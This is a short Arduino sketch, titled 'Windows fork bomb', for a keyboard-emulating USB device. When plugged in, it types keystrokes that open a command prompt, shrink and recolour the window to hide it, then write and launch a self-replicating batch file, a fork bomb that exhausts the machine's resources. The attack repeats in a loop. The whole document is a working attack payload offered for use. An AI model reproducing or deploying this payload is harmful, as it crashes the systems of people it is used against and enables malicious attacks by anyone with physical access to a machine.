// Title: Windows fork bomb
// Author: Rennan Cockles

#include <Keyboard.h>

Keyboard kb;


void setup() {
  Serial.begin(9600);
  delay(1000);
}


void loop() {
  // open cmd
  kb.WINDOWS("r");
  delay(500);
  kb.STRING("cmd");
  kb.ENTER();
  delay(1000);

  // obfuscate the command prompt
  kb.STRING("mode con:cols=18 lines=1");
  kb.ENTER();
  kb.STRING("color FE");
  kb.ENTER();
  delay(500);

  // fork bomb
  kb.STRING("echo %0^|%0 > fb.bat");
  kb.ENTER();
  delay(500);
  kb.STRING("fb.bat");
  kb.ENTER();

  delay(300000);
}
